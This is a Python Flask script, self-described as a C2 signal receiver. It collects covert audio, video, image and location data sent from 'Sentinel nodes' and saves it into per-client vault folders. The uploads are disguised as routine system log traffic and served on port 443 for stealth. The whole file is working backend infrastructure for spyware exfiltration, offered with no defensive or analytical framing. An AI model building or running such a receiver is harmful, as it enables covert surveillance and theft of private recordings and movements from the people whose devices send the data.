"""
LOPUTHJOSEPH - C2 SIGNAL RECEIVER
- Catch and organize stealth data from Sentinel nodes
- Disguised as routine system log uploads
- Supports audio, video, and location metadata
"""

from flask import Flask, request
import os
import time
import logging

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("C2_RECEIVER")

VAULT_DIR = "vault"
os.makedirs(VAULT_DIR, exist_ok=True)

@app.route('/api/v1/update', methods=['POST'])
def handle_incoming_intel():
    """Handle incoming stealth data disguised as system logs"""
    # Identify the node and data type from headers
    client_id = request.headers.get('X-Sentinel-ID', 'UNKNOWN_NODE')
    data_type = request.headers.get('X-Data-Type', 'system_log')
    
    # Create client-specific vault if it doesn't exist
    client_vault = os.path.join(VAULT_DIR, client_id)
    os.makedirs(client_vault, exist_ok=True)
    
    timestamp = int(time.time())
    
    # Determine file extension
    ext = "dat"
    if data_type == "video": ext = "mp4"
    elif data_type == "audio": ext = "wav"
    elif data_type == "image": ext = "jpg"
    elif data_type == "location": ext = "json"
    elif data_type == "alert": ext = "txt"
    
    file_path = os.path.join(client_vault, f"{data_type}_{timestamp}.{ext}")
    
    try:
        # Check if it's a file upload (multipart/form-data)
        if 'file' in request.files:
            file = request.files['file']
            file.save(file_path)
            logger.info(f"[+] Received FILE {data_type} from {client_id} -> Saved to {file_path}")
        else:
            # Otherwise, it's raw request data
            payload = request.data
            with open(file_path, "wb") as f:
                f.write(payload)
            logger.info(f"[+] Received RAW {data_type} from {client_id} -> Saved to {file_path}")
        
        return "ACK", 200
    except Exception as e:
        logger.error(f"[-] Failed to save data from {client_id}: {e}")
        return "FAIL", 500

@app.route('/health', methods=['GET'])
def health_check():
    return {"status": "ONLINE", "vault_size": len(os.listdir(VAULT_DIR))}, 200

if __name__ == '__main__':
    # Running on Port 443 (Standard HTTPS) for stealth
    # ssl_context='adhoc' provides a quick self-signed cert for testing
    logger.info("[*] C2 Receiver starting on port 443 (HTTPS)...")
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
